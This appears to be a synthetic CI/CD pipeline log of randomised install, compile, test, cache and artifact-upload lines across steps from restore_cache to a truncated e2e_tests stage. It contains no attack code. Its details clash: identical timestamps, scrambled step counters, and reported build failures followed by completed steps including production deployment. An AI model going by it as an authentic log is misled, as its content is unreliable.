axios@2.5.0\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (5MB)\n  PASS: test_user_create (399ms)\nStep 7/10: Building\nInstalling webpack@4.14.0\nInstalling eslint@5.7.0\nCompiling src/main.py...\nStep 5/10: Building\n[12:00:19] INFO: Processing request\n\u2713 test completed\nArtifact uploaded: build.tar.gz (25MB)\nCompiling src/main.py...\nCache hit for key-4324\nArtifact uploaded: build.tar.gz (29MB)\n  PASS: test_user_create (39ms)\nArtifact uploaded: build.tar.gz (50MB)\nWARNING: prettier has known vulnerabilities\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n  PASS: test_api_health (380ms)\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n  PASS: test_db_connect (222ms)\n\u2713 lint completed\nCompiling src/index.js...\nStep 9/10: Building\n\u2713 test completed\nCompiling src/index.js...\n[12:00:19] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n\u2713 lint completed\n[12:00:19] INFO: Processing request\nArtifact uploaded: build.tar.gz (1MB)\nInstalling prettier@5.0.0\n\u2713 test completed\n[12:00:19] INFO: Processing request\nStep 9/10: Building\nCache hit for key-6647\n\u2713 lint completed\nInstalling express@2.5.0\n[12:00:19] ERROR: Connection failed\n[12:00:19] WARN: Deprecated API usage\nCache hit for key-6104\nArtifact uploaded: build.tar.gz (18MB)\n[12:00:19] INFO: Processing request\nStep 6/10: Building\nCompiling src/service.java...\nWARNING: react has known vulnerabilities\nInstalling express@2.3.0\nInstalling webpack@5.19.0\n\u2713 test completed\n  PASS: test_cache_hit (385ms)\nStep 7/10: Building\n\u2713 lint completed\n[12:00:19] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (22MB)\n\u2713 build completed\nInstalling lodash@5.14.0\n\u2713 test completed\nCompiling src/index.js...\nCache hit for key-1782\n[12:00:19] WARN: Deprecated API usage\n[12:00:19] INFO: Processing request\nFAILED: test_db_connect\nInstalling webpack@2.18.0\nInstalling prettier@3.18.0\nCompiling src/handler.rs...\nStep 9/10: Building\nInstalling express@5.3.0\n  PASS: test_db_connect (7ms)\nArtifact uploaded: build.tar.gz (16MB)\nCompiling src/handler.rs...\n[12:00:19] INFO: Processing request\nCompiling src/service.java...\nCompiling src/service.java...\n\u2713 lint completed\n=== Step restore_cache completed ===\n=== Step: type_check ===\n  PASS: test_api_health (257ms)\nArtifact uploaded: build.tar.gz (44MB)\nCompiling src/utils.go...\n\u2713 lint completed\n[12:00:19] INFO: Processing request\nCache hit for key-4092\nStep 9/10: Building\n\u2713 test completed\nStep 3/10: Building\n[12:00:19] INFO: Processing request\nCache hit for key-8655\nInstalling axios@1.17.0\n  PASS: test_api_health (182ms)\nCompiling src/handler.rs...\nArtifact uploaded: build.tar.gz (45MB)\nStep 3/10: Building\nCompiling src/app.ts...\n[12:00:19] INFO: Processing request\nCompiling src/handler.rs...\n  PASS: test_cache_hit (404ms)\nArtifact uploaded: build.tar.gz (42MB)\nArtifact uploaded: build.tar.gz (27MB)\n\u2713 lint completed\nInstalling prettier@3.12.0\nWARNING: express has known vulnerabilities\n[12:00:19] WARN: Deprecated API usage\nCompiling src/utils.go...\n[12:00:19] INFO: Processing request\nCompiling src/service.java...\nCompiling src/main.py...\nCache hit for key-7417\n\u2713 lint completed\n[12:00:19] WARN: Deprecated API usage\nCache hit for key-3432\nStep 4/10: Building\nCompiling src/handler.rs...\nCompiling src/app.ts...\n[12:00:19] INFO: Processing request\n  PASS: test_api_health (438ms)\n\u2713 test completed\nArtifact uploaded: build.tar.gz (31MB)\nStep 6/10: Building\n[12:00:19] INFO: Processing request\n[12:00:19] WARN: Deprecated API usage\nStep 5/10: Building\nCache hit for key-7638\n  PASS: test_user_create (456ms)\nCompiling src/handler.rs...\n[12:00:19] INFO: Processing request\n[12:00:19] INFO: Processing request\nArtifact uploaded: build.tar.gz (38MB)\n\u2713 lint completed\nCompiling src/handler.rs...\nInstalling express@1.19.0\nInstalling prettier@4.0.0\n[12:00:19] INFO: Processing request\nArtifact uploaded: build.tar.gz (35MB)\nStep 4/10: Building\nArtifact uploaded: build.tar.gz (36MB)\nStep 1/10: Building\n\u2713 build completed\nWARNING: axios has known vulnerabilities\nCache hit for key-7776\n[12:00:19] INFO: Processing request\n[12:00:19] INFO: Processing request\nCache hit for key-2420\nStep 7/10: Building\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n  PASS: test_cache_hit (210ms)\nCache hit for key-9013\nCompiling src/utils.go...\nStep 3/10: Building\nArtifact uploaded: build.tar.gz (10MB)\nWARNING: eslint has known vulnerabilities\nCompiling src/utils.go...\n[12:00:19] INFO: Processing request\n[12:00:19] INFO: Processing request\nStep 8/10: Building\n\u2713 lint completed\nStep 4/10: Building\nException: NullPointerException\n\u2713 lint completed\nWARNING: prettier has known vulnerabilities\nArtifact uploaded: build.tar.gz (49MB)\n\u2713 test completed\nCache hit for key-5601\nStep 9/10: Building\n  PASS: test_db_connect (111ms)\nCache hit for key-6713\n  PASS: test_api_health (405ms)\nArtifact uploaded: build.tar.gz (29MB)\n\u2713 test completed\nArtifact uploaded: build.tar.gz (30MB)\n[12:00:19] INFO: Processing request\n  PASS: test_user_create (105ms)\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n[12:00:19] INFO: Processing request\nArtifact uploaded: build.tar.gz (49MB)\nInstalling eslint@1.6.0\nArtifact uploaded: build.tar.gz (5MB)\nCompiling src/index.js...\nInstalling express@2.17.0\nCache hit for key-1282\nCache hit for key-7995\nCompiling src/app.ts...\nInstalling lodash@1.0.0\nArtifact uploaded: build.tar.gz (12MB)\n[12:00:19] INFO: Processing request\nStep 3/10: Building\nCompiling src/utils.go...\nArtifact uploaded: build.tar.gz (6MB)\nArtifact uploaded: build.tar.gz (10MB)\nArtifact uploaded: build.tar.gz (11MB)\nInstalling express@1.13.0\n  PASS: test_db_connect (136ms)\nInstalling lodash@3.18.0\n\u2713 lint completed\nInstalling react@1.12.0\n[12:00:19] INFO: Processing request\nInstalling react@5.1.0\n\u2713 test completed\nCompiling src/main.py...\n  PASS: test_auth_login (101ms)\nStep 2/10: Building\n  PASS: test_auth_login (203ms)\nStep 8/10: Building\n[12:00:19] INFO: Processing request\nCache hit for key-4568\nInstalling webpack@5.5.0\nInstalling jest@5.10.0\nCache hit for key-8441\nCache hit for key-5803\n  PASS: test_cache_hit (194ms)\nCompiling src/main.py...\n[12:00:19] INFO: Processing request\nCache hit for key-6760\nStep 6/10: Building\n  PASS: test_db_connect (151ms)\nStep 9/10: Building\n  PASS: test_cache_hit (366ms)\nCompiling src/app.ts...\n  PASS: test_db_connect (473ms)\nCache hit for key-9788\nArtifact uploaded: build.tar.gz (36MB)\nInstalling axios@5.11.0\nCache hit for key-9655\nInstalling webpack@3.18.0\n[12:00:19] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n  PASS: test_db_connect (147ms)\n=== Step type_check completed ===\n=== Step: setup_environment ===\nCompiling src/index.js...\nInstalling jest@1.15.0\nInstalling webpack@5.5.0\nCache hit for key-2454\nCache hit for key-8621\nArtifact uploaded: build.tar.gz (2MB)\nCache hit for key-3562\nArtifact uploaded: build.tar.gz (25MB)\nCache hit for key-5798\nInstalling react@5.14.0\n\u2713 test completed\nInstalling prettier@2.1.0\n  PASS: test_cache_hit (290ms)\nCompiling src/index.js...\n[12:00:19] INFO: Processing request\n\u2717 build failed with exit code 99\nInstalling webpack@4.4.0\n  PASS: test_api_health (337ms)\n\u2713 test completed\nStep 7/10: Building\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n[12:00:19] INFO: Processing request\nInstalling jest@4.18.0\nArtifact uploaded: build.tar.gz (31MB)\nCache hit for key-7031\nCompiling src/handler.rs...\nInstalling axios@1.2.0\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n[12:00:19] ERROR: Connection failed\nInstalling eslint@2.11.0\nCache hit for key-9614\nArtifact uploaded: build.tar.gz (21MB)\n[12:00:19] INFO: Processing request\n\u2713 build completed\nCompiling src/utils.go...\nCompiling src/utils.go...\n[12:00:19] INFO: Processing request\n[12:00:19] INFO: Processing request\nStep 6/10: Building\nStep 7/10: Building\nWARNING: axios has known vulnerabilities\nCompiling src/handler.rs...\nCompiling src/main.py...\n[12:00:19] WARN: Deprecated API usage\nCompiling src/index.js...\nInstalling lodash@3.8.0\n[12:00:19] INFO: Processing request\nCache hit for key-9343\n[12:00:19] INFO: Processing request\nArtifact uploaded: build.tar.gz (12MB)\nInstalling react@4.14.0\nArtifact uploaded: build.tar.gz (24MB)\nCompiling src/handler.rs...\nInstalling jest@1.1.0\nInstalling webpack@4.17.0\n  PASS: test_user_create (379ms)\n[12:00:19] WARN: Deprecated API usage\n[12:00:19] INFO: Processing request\nStep 4/10: Building\nCompiling src/main.py...\n[12:00:19] INFO: Processing request\nArtifact uploaded: build.tar.gz (37MB)\nCompiling src/service.java...\n[12:00:19] ERROR: Connection failed\nStep 5/10: Building\n\u2713 build completed\nCompiling src/main.py...\nArtifact uploaded: build.tar.gz (41MB)\nStep 9/10: Building\n\u2713 build completed\n\u2713 test completed\nStep 4/10: Building\nStep 6/10: Building\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nArtifact uploaded: build.tar.gz (45MB)\n\u2713 test completed\n[12:00:19] INFO: Processing request\nInstalling eslint@4.15.0\n\u2713 test completed\n[12:00:19] INFO: Processing request\n  PASS: test_user_create (202ms)\n[12:00:19] INFO: Processing request\nCache hit for key-1283\nInstalling jest@5.9.0\n  PASS: test_api_health (341ms)\n\u2713 test completed\n  PASS: test_cache_hit (276ms)\n[12:00:19] INFO: Processing request\n\u2713 lint completed\n  PASS: test_user_create (246ms)\nStep 8/10: Building\nArtifact uploaded: build.tar.gz (30MB)\n  PASS: test_api_health (196ms)\nCompiling src/index.js...\n[12:00:19] INFO: Processing request\nException: TypeError\nStep 7/10: Building\nCompiling src/app.ts...\n  PASS: test_db_connect (168ms)\nStep 10/10: Building\nArtifact uploaded: build.tar.gz (40MB)\nCompiling src/utils.go...\nStep 1/10: Building\n  PASS: test_user_create (490ms)\nCompiling src/utils.go...\n[12:00:19] ERROR: Connection failed\nArtifact uploaded: build.tar.gz (14MB)\n  PASS: test_db_connect (169ms)\n  PASS: test_user_create (137ms)\n\u2713 lint completed\nCompiling src/index.js...\nInstalling eslint@4.6.0\nInstalling express@4.2.0\n  PASS: test_user_create (74ms)\n[12:00:19] INFO: Processing request\nCache hit for key-7241\n  PASS: test_api_health (170ms)\nCache hit for key-8668\nStep 6/10: Building\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n\u2713 build completed\n[12:00:19] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nStep 8/10: Building\n  PASS: test_cache_hit (84ms)\nFAILED: test_auth_login\n[12:00:19] INFO: Processing request\nCache hit for key-7506\nCompiling src/utils.go...\n  PASS: test_cache_hit (438ms)\nInstalling eslint@5.15.0\nStep 3/10: Building\nInstalling webpack@2.18.0\nCache hit for key-6943\n\u2713 lint completed\nException: RuntimeError\n[12:00:19] INFO: Processing request\nCompiling src/service.java...\n[12:00:19] INFO: Processing request\n[12:00:19] INFO: Processing request\n  PASS: test_cache_hit (407ms)\n\u2713 lint completed\nStep 2/10: Building\nArtifact uploaded: build.tar.gz (11MB)\nInstalling jest@2.13.0\nCompiling src/main.py...\n[12:00:19] INFO: Processing request\n[12:00:19] INFO: Processing request\n\u2713 test completed\nCompiling src/app.ts...\n=== Step setup_environment completed ===\n=== Step: integration_tests ===\n  PASS: test_api_health (137ms)\nStep 5/10: Building\nCompiling src/index.js...\nCompiling src/utils.go...\nStep 1/10: Building\n[12:00:19] INFO: Processing request\n\u2717 build failed with exit code 94\nInstalling prettier@5.15.0\nCache hit for key-8674\n  PASS: test_db_connect (11ms)\nCompiling src/service.java...\nCompiling src/index.js...\nStep 6/10: Building\nArtifact uploaded: build.tar.gz (50MB)\n\u2713 build completed\n  PASS: test_db_connect (120ms)\nArtifact uploaded: build.tar.gz (35MB)\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCompiling src/handler.rs...\n[12:00:19] INFO: Processing request\nStep 5/10: Building\n[12:00:19] INFO: Processing request\nInstalling react@1.8.0\nArtifact uploaded: build.tar.gz (21MB)\n\u2713 build completed\nCache hit for key-9399\nCache hit for key-6968\nArtifact uploaded: build.tar.gz (7MB)\n  PASS: test_user_create (15ms)\n[12:00:19] INFO: Processing request\n  PASS: test_cache_hit (262ms)\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:00:19] ERROR: Connection failed\nInstalling prettier@1.2.0\n[12:00:19] INFO: Processing request\nInstalling jest@5.12.0\nStep 3/10: Building\nCache hit for key-8950\nWARNING: express has known vulnerabilities\nArtifact uploaded: build.tar.gz (49MB)\n  PASS: test_api_health (10ms)\nCompiling src/main.py...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nStep 7/10: Building\n\u2713 build completed\nStep 4/10: Building\nInstalling react@3.0.0\n\u2713 test completed\nArtifact uploaded: build.tar.gz (11MB)\n[12:00:19] INFO: Processing request\n  PASS: test_user_create (385ms)\nStep 10/10: Building\n\u2713 lint completed\n[12:00:19] WARN: Deprecated API usage\n  PASS: test_api_health (382ms)\nStep 9/10: Building\n\u2713 build completed\n\u2713 build completed\nStep 9/10: Building\n\u2713 lint completed\n[12:00:19] INFO: Processing request\n\u2713 lint completed\n  PASS: test_db_connect (230ms)\nCompiling src/utils.go...\n[12:00:19] INFO: Processing request\nCache hit for key-2549\n  PASS: test_auth_login (256ms)\nInstalling webpack@3.14.0\nCache hit for key-9823\nStep 5/10: Building\nArtifact uploaded: build.tar.gz (6MB)\n  PASS: test_db_connect (55ms)\nInstalling lodash@5.12.0\nInstalling webpack@5.13.0\n  PASS: test_auth_login (409ms)\nStep 5/10: Building\nCompiling src/handler.rs...\n[12:00:19] INFO: Processing request\nWARNING: axios has known vulnerabilities\n\u2713 lint completed\nCompiling src/service.java...\n[12:00:19] ERROR: Connection failed\n[12:00:19] INFO: Processing request\nInstalling jest@1.6.0\nArtifact uploaded: build.tar.gz (5MB)\nArtifact uploaded: build.tar.gz (26MB)\nCompiling src/app.ts...\nStep 3/10: Building\nStep 10/10: Building\n  PASS: test_db_connect (365ms)\n[12:00:19] INFO: Processing request\nCompiling src/service.java...\nInstalling react@2.13.0\nCompiling src/handler.rs...\n\u2713 build completed\nCache hit for key-1967\nCache hit for key-8530\n\u2713 lint completed\n\u2713 test completed\n[12:00:19] WARN: Deprecated API usage\n[12:00:19] INFO: Processing request\nFAILED: test_auth_login\n\u2713 lint completed\n  PASS: test_api_health (1ms)\n[12:00:19] INFO: Processing request\nStep 8/10: Building\nFAILED: test_db_connect\nCompiling src/app.ts...\nInstalling prettier@3.15.0\nCompiling src/index.js...\nCompiling src/app.ts...\nCompiling src/utils.go...\n[12:00:19] INFO: Processing request\n[12:00:19] INFO: Processing request\nArtifact uploaded: build.tar.gz (25MB)\nCompiling src/index.js...\nCompiling src/app.ts...\nCache hit for key-1857\nCache hit for key-8248\nStep 6/10: Building\n  PASS: test_user_create (184ms)\nInstalling express@1.10.0\nCache hit for key-7491\nInstalling eslint@1.9.0\nInstalling eslint@4.9.0\n  PASS: test_api_health (126ms)\nInstalling lodash@5.16.0\n\u2713 lint completed\nInstalling axios@3.13.0\nWARNING: eslint has known vulnerabilities\nStep 4/10: Building\n[12:00:19] INFO: Processing request\n  PASS: test_api_health (66ms)\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCompiling src/app.ts...\nCache hit for key-2689\n\u2713 test completed\n[12:00:19] INFO: Processing request\nWARNING: axios has known vulnerabilities\nCompiling src/handler.rs...\n[12:00:19] WARN: Deprecated API usage\nCompiling src/index.js...\nWARNING: express has known vulnerabilities\nCompiling src/service.java...\nCache hit for key-5521\nInstalling react@1.9.0\nArtifact uploaded: build.tar.gz (39MB)\n\u2717 build failed with exit code 114\nArtifact uploaded: build.tar.gz (39MB)\nCompiling src/service.java...\n=== Step integration_tests completed ===\n=== Step: setup_node ===\nArtifact uploaded: build.tar.gz (48MB)\n\u2713 test completed\nArtifact uploaded: build.tar.gz (17MB)\n\u2713 build completed\nWARNING: react has known vulnerabilities\nArtifact uploaded: build.tar.gz (29MB)\nCache hit for key-8419\nCache hit for key-4976\nStep 3/10: Building\nInstalling lodash@3.13.0\n[12:00:19] INFO: Processing request\n\u2713 test completed\n[12:00:19] INFO: Processing request\nArtifact uploaded: build.tar.gz (35MB)\nCache hit for key-4089\n[12:00:19] INFO: Processing request\n[12:00:19] INFO: Processing request\nArtifact uploaded: build.tar.gz (19MB)\nInstalling webpack@1.11.0\nCompiling src/main.py...\nArtifact uploaded: build.tar.gz (15MB)\n[12:00:19] INFO: Processing request\n[12:00:19] INFO: Processing request\n\u2713 test completed\nInstalling webpack@2.9.0\nWARNING: jest has known vulnerabilities\nInstalling eslint@4.3.0\nCache hit for key-6857\n\u2713 build completed\n\u2713 test completed\nCompiling src/utils.go...\n\u2713 test completed\nCache hit for key-6381\nInstalling axios@1.3.0\nCompiling src/main.py...\nArtifact uploaded: build.tar.gz (47MB)\nFAILED: test_user_create\n  PASS: test_api_health (337ms)\nArtifact uploaded: build.tar.gz (47MB)\n\u2713 build completed\n  PASS: test_auth_login (372ms)\nCache hit for key-3457\nInstalling eslint@5.11.0\nCompiling src/handler.rs...\nInstalling react@2.18.0\nCompiling src/handler.rs...\nCache hit for key-9366\nStep 7/10: Building\nArtifact uploaded: build.tar.gz (30MB)\nStep 7/10: Building\nArtifact uploaded: build.tar.gz (50MB)\n[12:00:19] INFO: Processing request\nCache hit for key-4582\nCompiling src/utils.go...\nCache hit for key-8890\nStep 9/10: Building\n  PASS: test_api_health (181ms)\n\u2713 test completed\nInstalling webpack@1.20.0\nCache hit for key-5618\nCompiling src/handler.rs...\nArtifact uploaded: build.tar.gz (32MB)\n\u2717 build failed with exit code 118\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCache hit for key-2059\n[12:00:19] INFO: Processing request\nArtifact uploaded: build.tar.gz (6MB)\nCache hit for key-5405\nArtifact uploaded: build.tar.gz (21MB)\nStep 7/10: Building\n\u2713 lint completed\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nFAILED: test_cache_hit\n[12:00:19] INFO: Processing request\n  PASS: test_api_health (10ms)\n[12:00:19] INFO: Processing request\nInstalling prettier@5.0.0\n[12:00:19] INFO: Processing request\n\u2713 test completed\nCache hit for key-8787\nWARNING: jest has known vulnerabilities\n[12:00:19] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (1MB)\n[12:00:19] WARN: Deprecated API usage\n\u2713 build completed\nArtifact uploaded: build.tar.gz (7MB)\nCache hit for key-9258\nWARNING: axios has known vulnerabilities\nException: NullPointerException\n\u2717 build failed with exit code 55\n[12:00:19] INFO: Processing request\nCache hit for key-5771\n[12:00:19] INFO: Processing request\nCompiling src/utils.go...\nCache hit for key-7970\nCache hit for key-6887\nArtifact uploaded: build.tar.gz (30MB)\n  PASS: test_cache_hit (218ms)\nStep 6/10: Building\nCache hit for key-7395\nInstalling axios@1.10.0\n  PASS: test_db_connect (98ms)\nArtifact uploaded: build.tar.gz (49MB)\nCompiling src/main.py...\nCompiling src/service.java...\nArtifact uploaded: build.tar.gz (35MB)\nCompiling src/app.ts...\n[12:00:19] INFO: Processing request\n[12:00:19] INFO: Processing request\nInstalling react@5.17.0\nStep 6/10: Building\nStep 7/10: Building\nCompiling src/app.ts...\nArtifact uploaded: build.tar.gz (29MB)\n\u2713 lint completed\n\u2713 build completed\n[12:00:19] INFO: Processing request\nCompiling src/utils.go...\nInstalling axios@3.18.0\n[12:00:19] INFO: Processing request\nCompiling src/service.java...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nArtifact uploaded: build.tar.gz (10MB)\nCache hit for key-9986\nInstalling prettier@2.15.0\nStep 2/10: Building\nCompiling src/service.java...\nStep 5/10: Building\n\u2713 build completed\nStep 4/10: Building\nCache hit for key-9994\n\u2713 build completed\nCache hit for key-9066\nCache hit for key-1211\n  PASS: test_auth_login (63ms)\nInstalling prettier@4.20.0\nWARNING: prettier has known vulnerabilities\n\u2713 test completed\nStep 10/10: Building\nInstalling express@5.3.0\nCache hit for key-3502\nInstalling lodash@5.0.0\n[12:00:19] WARN: Deprecated API usage\n  PASS: test_auth_login (55ms)\nCache hit for key-7548\nCache hit for key-3100\nArtifact uploaded: build.tar.gz (36MB)\n  PASS: test_user_create (498ms)\n  PASS: test_auth_login (131ms)\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n=== Step setup_node completed ===\n=== Step: save_cache ===\nArtifact uploaded: build.tar.gz (40MB)\nCompiling src/utils.go...\n\u2713 lint completed\nInstalling prettier@4.3.0\nCache hit for key-9983\n  PASS: test_api_health (144ms)\nStep 10/10: Building\n  PASS: test_user_create (164ms)\nCache hit for key-9105\n[12:00:19] INFO: Processing request\nArtifact uploaded: build.tar.gz (45MB)\n\u2713 lint completed\nStep 1/10: Building\nCache hit for key-7292\nStep 9/10: Building\nFAILED: test_cache_hit\n  PASS: test_db_connect (314ms)\n\u2713 build completed\nStep 8/10: Building\nCache hit for key-8188\nStep 2/10: Building\n\u2713 test completed\nCompiling src/app.ts...\nInstalling lodash@5.18.0\n  PASS: test_user_create (439ms)\nCache hit for key-8155\nInstalling eslint@5.2.0\n\u2717 build failed with exit code 96\n\u2713 test completed\nCache hit for key-6765\nCache hit for key-3022\nArtifact uploaded: build.tar.gz (13MB)\n[12:00:19] INFO: Processing request\nCompiling src/utils.go...\nCompiling src/app.ts...\nCompiling src/main.py...\nInstalling express@1.9.0\nException: ValueError\n[12:00:19] WARN: Deprecated API usage\nStep 7/10: Building\nInstalling webpack@3.1.0\nCompiling src/utils.go...\nArtifact uploaded: build.tar.gz (34MB)\n  PASS: test_db_connect (466ms)\n  PASS: test_cache_hit (97ms)\nStep 3/10: Building\n\u2717 build failed with exit code 123\nInstalling prettier@1.3.0\nCache hit for key-9746\n[12:00:19] INFO: Processing request\nInstalling webpack@4.0.0\n[12:00:19] INFO: Processing request\n  PASS: test_cache_hit (218ms)\n\u2713 test completed\n  PASS: test_api_health (56ms)\nStep 2/10: Building\nStep 3/10: Building\nArtifact uploaded: build.tar.gz (37MB)\nInstalling prettier@2.18.0\nCompiling src/service.java...\nStep 1/10: Building\nArtifact uploaded: build.tar.gz (41MB)\nWARNING: express has known vulnerabilities\nCache hit for key-4808\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCache hit for key-7597\n[12:00:19] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCompiling src/app.ts...\n[12:00:19] INFO: Processing request\n[12:00:19] INFO: Processing request\nArtifact uploaded: build.tar.gz (27MB)\nCache hit for key-5703\nInstalling prettier@1.2.0\n[12:00:19] INFO: Processing request\n  PASS: test_api_health (314ms)\n\u2713 test completed\nCache hit for key-3231\n  PASS: test_api_health (86ms)\nArtifact uploaded: build.tar.gz (12MB)\nWARNING: react has known vulnerabilities\nArtifact uploaded: build.tar.gz (5MB)\n[12:00:19] WARN: Deprecated API usage\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCache hit for key-2202\n[12:00:19] INFO: Processing request\n[12:00:19] INFO: Processing request\nCache hit for key-4842\n[12:00:19] INFO: Processing request\nCompiling src/service.java...\nArtifact uploaded: build.tar.gz (8MB)\nInstalling eslint@3.14.0\n\u2717 build failed with exit code 12\n[12:00:19] INFO: Processing request\n[12:00:19] INFO: Processing request\nArtifact uploaded: build.tar.gz (44MB)\nFAILED: test_cache_hit\nWARNING: axios has known vulnerabilities\nStep 6/10: Building\nCache hit for key-1164\nInstalling axios@2.16.0\n[12:00:19] INFO: Processing request\n[12:00:19] INFO: Processing request\nArtifact uploaded: build.tar.gz (3MB)\nStep 5/10: Building\nWARNING: eslint has known vulnerabilities\n\u2713 test completed\nCache hit for key-3372\nCache hit for key-8085\nCompiling src/app.ts...\n  PASS: test_auth_login (61ms)\nCache hit for key-4796\n\u2713 test completed\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCache hit for key-7368\nCache hit for key-3893\nArtifact uploaded: build.tar.gz (8MB)\n\u2713 build completed\n\u2713 test completed\nCompiling src/service.java...\n  PASS: test_auth_login (389ms)\nWARNING: prettier has known vulnerabilities\n[12:00:19] INFO: Processing request\nCache hit for key-1414\nStep 4/10: Building\n[12:00:19] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:00:19] INFO: Processing request\n[12:00:19] INFO: Processing request\nWARNING: lodash has known vulnerabilities\nCompiling src/main.py...\nInstalling jest@2.16.0\n[12:00:19] INFO: Processing request\nCache hit for key-1016\nCompiling src/app.ts...\nCache hit for key-9142\nStep 8/10: Building\nArtifact uploaded: build.tar.gz (48MB)\nCache hit for key-2979\n\u2713 lint completed\n  PASS: test_auth_login (104ms)\n\u2713 build completed\n\u2713 test completed\nStep 1/10: Building\n\u2713 lint completed\nInstalling lodash@5.2.0\nCompiling src/app.ts...\nCache hit for key-1511\nArtifact uploaded: build.tar.gz (42MB)\nCache hit for key-8695\n=== Step save_cache completed ===\n=== Step: deploy_production ===\nArtifact uploaded: build.tar.gz (8MB)\nInstalling react@5.1.0\n\u2713 test completed\nInstalling express@1.4.0\nArtifact uploaded: build.tar.gz (11MB)\n\u2713 test completed\n  PASS: test_auth_login (422ms)\n[12:00:19] ERROR: Connection failed\n\u2713 build completed\nCompiling src/service.java...\nCache hit for key-6083\n\u2713 test completed\n[12:00:19] INFO: Processing request\nException: NullPointerException\n[12:00:19] INFO: Processing request\n\u2713 lint completed\nStep 2/10: Building\nStep 5/10: Building\nCompiling src/app.ts...\nCompiling src/main.py...\n  PASS: test_api_health (26ms)\n\u2713 test completed\nCache hit for key-7364\n\u2713 lint completed\n[12:00:19] ERROR: Connection failed\n\u2713 build completed\nInstalling axios@4.1.0\n[12:00:19] WARN: Deprecated API usage\nCompiling src/index.js...\nInstalling axios@2.1.0\nCache hit for key-5181\n\u2713 build completed\n[12:00:19] WARN: Deprecated API usage\nCache hit for key-3402\n\u2713 lint completed\nInstalling jest@5.1.0\n\u2713 test completed\n  PASS: test_auth_login (129ms)\nInstalling jest@5.7.0\n  PASS: test_db_connect (417ms)\nStep 7/10: Building\nCache hit for key-7972\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (43MB)\n  PASS: test_cache_hit (452ms)\nStep 5/10: Building\nCache hit for key-5985\nCache hit for key-9108\n[12:00:19] INFO: Processing request\nArtifact uploaded: build.tar.gz (32MB)\n  PASS: test_db_connect (334ms)\n\u2717 build failed with exit code 46\n  PASS: test_db_connect (247ms)\nCompiling src/app.ts...\n[12:00:19] INFO: Processing request\nInstalling express@3.10.0\n\u2713 lint completed\nCompiling src/service.java...\n[12:00:19] WARN: Deprecated API usage\nStep 6/10: Building\nStep 4/10: Building\n[12:00:19] INFO: Processing request\n  PASS: test_cache_hit (136ms)\nCompiling src/service.java...\nCompiling src/index.js...\nException: NullPointerException\nStep 8/10: Building\nCompiling src/handler.rs...\nCompiling src/handler.rs...\n[12:00:19] INFO: Processing request\nStep 6/10: Building\nException: NullPointerException\nCompiling src/app.ts...\nInstalling eslint@1.5.0\nCompiling src/utils.go...\nStep 1/10: Building\nStep 3/10: Building\nCompiling src/utils.go...\nCache hit for key-4408\nCompiling src/app.ts...\n\u2713 lint completed\nInstalling prettier@4.19.0\nCompiling src/index.js...\n[12:00:19] INFO: Processing request\n[12:00:19] ERROR: Connection failed\nCache hit for key-9572\nInstalling jest@4.18.0\nWARNING: react has known vulnerabilities\nInstalling webpack@4.4.0\nCompiling src/index.js...\nStep 3/10: Building\n  PASS: test_db_connect (141ms)\nInstalling jest@2.6.0\nWARNING: webpack has known vulnerabilities\nInstalling prettier@3.1.0\n\u2713 build completed\nCompiling src/utils.go...\nArtifact uploaded: build.tar.gz (7MB)\nCache hit for key-6300\n  PASS: test_auth_login (64ms)\nCache hit for key-6869\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (19MB)\nCache hit for key-7211\nCompiling src/handler.rs...\nCache hit for key-9529\n[12:00:19] INFO: Processing request\n  PASS: test_db_connect (292ms)\nArtifact uploaded: build.tar.gz (24MB)\nStep 4/10: Building\nCompiling src/handler.rs...\nStep 8/10: Building\n  PASS: test_user_create (205ms)\nStep 6/10: Building\n\u2713 test completed\n  PASS: test_auth_login (473ms)\nCache hit for key-8138\n  PASS: test_db_connect (401ms)\nArtifact uploaded: build.tar.gz (46MB)\nInstalling eslint@5.8.0\n\u2713 test completed\nArtifact uploaded: build.tar.gz (24MB)\nArtifact uploaded: build.tar.gz (43MB)\nArtifact uploaded: build.tar.gz (42MB)\nStep 9/10: Building\n[12:00:19] WARN: Deprecated API usage\nInstalling webpack@2.16.0\nCache hit for key-4983\nCompiling src/main.py...\n\u2713 build completed\n\u2717 build failed with exit code 100\nStep 1/10: Building\nException: ValueError\nCache hit for key-1229\nCompiling src/service.java...\nCache hit for key-3660\n  PASS: test_auth_login (344ms)\nCache hit for key-8662\nCompiling src/main.py...\n\u2713 test completed\nCompiling src/utils.go...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCache hit for key-3619\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nArtifact uploaded: build.tar.gz (22MB)\nInstalling webpack@3.17.0\nArtifact uploaded: build.tar.gz (40MB)\n  PASS: test_user_create (128ms)\nException: ValueError\nArtifact uploaded: build.tar.gz (16MB)\n=== Step deploy_production completed ===\n=== Step: e2e_tests ===\n  PASS: test_db_connect (35ms)\nInstalling webpack@4.12.0\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCache hit for key-9395\nStep 8/10: Building\nCompiling src/handler.rs...\n[12:00:19] 